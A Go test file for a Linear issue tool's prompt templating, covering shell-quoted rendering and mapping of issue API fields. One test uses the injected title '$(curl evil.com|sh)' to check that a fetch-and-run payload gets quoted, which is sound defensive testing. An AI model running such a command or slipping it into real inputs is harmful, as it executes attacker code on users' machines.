package prompt

import (
	"testing"

	"github.com/duboisf/linear/internal/api"
)

func TestRender_LegacyPlaceholder(t *testing.T) {
	t.Parallel()
	data := IssueData{Identifier: "AIS-123", Title: "Fix login bug"}
	got, err := Render("Let's work on linear issue {identifier}", data)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	want := "Let's work on linear issue AIS-123"
	if got != want {
		t.Errorf("got %q, want %q", got, want)
	}
}

func TestRender_GoTemplate_ShellQuotedByDefault(t *testing.T) {
	t.Parallel()
	data := IssueData{
		Identifier: "AIS-123",
		Title:      "Fix login bug",
		State:      "In Progress",
		Priority:   "High",
	}
	got, err := Render("cmd {{.Identifier}} {{.Title}} {{.State}} {{.Priority}}", data)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	want := "cmd 'AIS-123' 'Fix login bug' 'In Progress' 'High'"
	if got != want {
		t.Errorf("got %q, want %q", got, want)
	}
}

func TestRender_GoTemplate_RawAccess(t *testing.T) {
	t.Parallel()
	data := IssueData{
		Identifier: "AIS-123",
		Title:      "Fix login bug",
	}
	got, err := Render("{{.Raw.Identifier}}: {{.Raw.Title}}", data)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	want := "AIS-123: Fix login bug"
	if got != want {
		t.Errorf("got %q, want %q", got, want)
	}
}

func TestRender_GoTemplate_ShellInjectionPrevented(t *testing.T) {
	t.Parallel()
	data := IssueData{
		Identifier: "AIS-123",
		Title:      "$(curl evil.com|sh)",
	}
	got, err := Render("cmd {{.Title}}", data)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	want := "cmd '$(curl evil.com|sh)'"
	if got != want {
		t.Errorf("got %q, want %q", got, want)
	}
}

func TestRender_GoTemplate_SingleQuoteEscaped(t *testing.T) {
	t.Parallel()
	data := IssueData{
		Identifier: "AIS-123",
		Title:      "it's a bug",
	}
	got, err := Render("cmd {{.Title}}", data)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	want := `cmd 'it'\''s a bug'`
	if got != want {
		t.Errorf("got %q, want %q", got, want)
	}
}

func TestRender_GoTemplateConditional(t *testing.T) {
	t.Parallel()
	data := IssueData{
		Identifier:  "AIS-123",
		Title:       "Fix login bug",
		Description: "Users can't log in",
	}
	tmpl := `{{.Identifier}} {{.Title}}{{if .Raw.Description}} {{.Description}}{{end}}`
	got, err := Render(tmpl, data)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	want := "'AIS-123' 'Fix login bug' 'Users can'\\''t log in'"
	if got != want {
		t.Errorf("got %q, want %q", got, want)
	}
}

func TestRender_GoTemplateNoDescription(t *testing.T) {
	t.Parallel()
	data := IssueData{
		Identifier: "AIS-123",
		Title:      "Fix login bug",
	}
	tmpl := `{{.Identifier}} {{.Title}}{{if .Raw.Description}} {{.Description}}{{end}}`
	got, err := Render(tmpl, data)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	want := "'AIS-123' 'Fix login bug'"
	if got != want {
		t.Errorf("got %q, want %q", got, want)
	}
}

func TestRender_GoTemplateLabels(t *testing.T) {
	t.Parallel()
	data := IssueData{
		Identifier: "AIS-123",
		Title:      "Fix bug",
		Labels:     []string{"bug", "frontend"},
	}
	tmpl := `{{.Identifier}} {{.Labels}}`
	got, err := Render(tmpl, data)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	want := "'AIS-123' 'bug,frontend'"
	if got != want {
		t.Errorf("got %q, want %q", got, want)
	}
}

func TestRender_InvalidTemplate(t *testing.T) {
	t.Parallel()
	data := IssueData{Identifier: "AIS-123"}
	_, err := Render("{{.Invalid", data)
	if err == nil {
		t.Fatal("expected error for invalid template")
	}
}

func TestIsTemplate(t *testing.T) {
	t.Parallel()
	tests := []struct {
		input string
		want  bool
	}{
		{"Let's work on {identifier}", false},
		{"Work on {{.Identifier}}", true},
		{"plain text", false},
		{"{{if .Title}}yes{{end}}", true},
	}
	for _, tt := range tests {
		if got := IsTemplate(tt.input); got != tt.want {
			t.Errorf("IsTemplate(%q) = %v, want %v", tt.input, got, tt.want)
		}
	}
}

func TestNewIssueData_FullIssue(t *testing.T) {
	t.Parallel()
	desc := "A description"
	dueDate := "2026-03-01"
	cycleName := "Sprint 12"
	issue := &api.GetIssueIssue{
		Identifier:  "AIS-42",
		Title:       "Test issue",
		Description: &desc,
		Url:         "https://linear.app/team/AIS-42",
		BranchName:  "fred/ais-42-test-issue",
		Priority:    2,
		DueDate:     &dueDate,
		State: &api.GetIssueIssueStateWorkflowState{
			Name: "In Progress",
		},
		Assignee: &api.GetIssueIssueAssigneeUser{
			Name: "Fred",
		},
		Team: &api.GetIssueIssueTeam{
			Name: "Aisystems",
			Key:  "AIS",
		},
		Cycle: &api.GetIssueIssueCycle{
			Name: &cycleName,
		},
		Project: &api.GetIssueIssueProject{
			Name: "My Project",
		},
		Labels: &api.GetIssueIssueLabelsIssueLabelConnection{
			Nodes: []*api.GetIssueIssueLabelsIssueLabelConnectionNodesIssueLabel{
				{Name: "bug"},
				{Name: "frontend"},
			},
		},
		Parent: &api.GetIssueIssueParentIssue{
			Identifier: "AIS-10",
		},
	}
	d := NewIssueData(issue)

	if d.Identifier != "AIS-42" {
		t.Errorf("Identifier = %q, want AIS-42", d.Identifier)
	}
	if d.Title != "Test issue" {
		t.Errorf("Title = %q, want Test issue", d.Title)
	}
	if d.Description != "A description" {
		t.Errorf("Description = %q, want A description", d.Description)
	}
	if d.URL != "https://linear.app/team/AIS-42" {
		t.Errorf("URL = %q", d.URL)
	}
	if d.BranchName != "fred/ais-42-test-issue" {
		t.Errorf("BranchName = %q", d.BranchName)
	}
	if d.Priority != "High" {
		t.Errorf("Priority = %q, want High", d.Priority)
	}
	if d.State != "In Progress" {
		t.Errorf("State = %q, want In Progress", d.State)
	}
	if d.Assignee != "Fred" {
		t.Errorf("Assignee = %q, want Fred", d.Assignee)
	}
	if d.Team != "Aisystems" {
		t.Errorf("Team = %q, want Aisystems", d.Team)
	}
	if d.TeamKey != "AIS" {
		t.Errorf("TeamKey = %q, want AIS", d.TeamKey)
	}
	if d.Cycle != "Sprint 12" {
		t.Errorf("Cycle = %q, want Sprint 12", d.Cycle)
	}
	if d.Project != "My Project" {
		t.Errorf("Project = %q, want My Project", d.Project)
	}
	if len(d.Labels) != 2 || d.Labels[0] != "bug" || d.Labels[1] != "frontend" {
		t.Errorf("Labels = %v, want [bug frontend]", d.Labels)
	}
	if d.DueDate != "2026-03-01" {
		t.Errorf("DueDate = %q, want 2026-03-01", d.DueDate)
	}
	if d.Parent != "AIS-10" {
		t.Errorf("Parent = %q, want AIS-10", d.Parent)
	}
}

func TestNewIssueData_NilFields(t *testing.T) {
	t.Parallel()
	issue := &api.GetIssueIssue{
		Identifier: "AIS-1",
		Title:      "Minimal issue",
		Priority:   0,
	}
	d := NewIssueData(issue)

	if d.Identifier != "AIS-1" {
		t.Errorf("Identifier = %q, want AIS-1", d.Identifier)
	}
	if d.Description != "" {
		t.Errorf("Description = %q, want empty", d.Description)
	}
	if d.State != "" {
		t.Errorf("State = %q, want empty", d.State)
	}
	if d.Priority != "None" {
		t.Errorf("Priority = %q, want None", d.Priority)
	}
	if d.Assignee != "" {
		t.Errorf("Assignee = %q, want empty", d.Assignee)
	}
	if d.Labels != nil {
		t.Errorf("Labels = %v, want nil", d.Labels)
	}
}
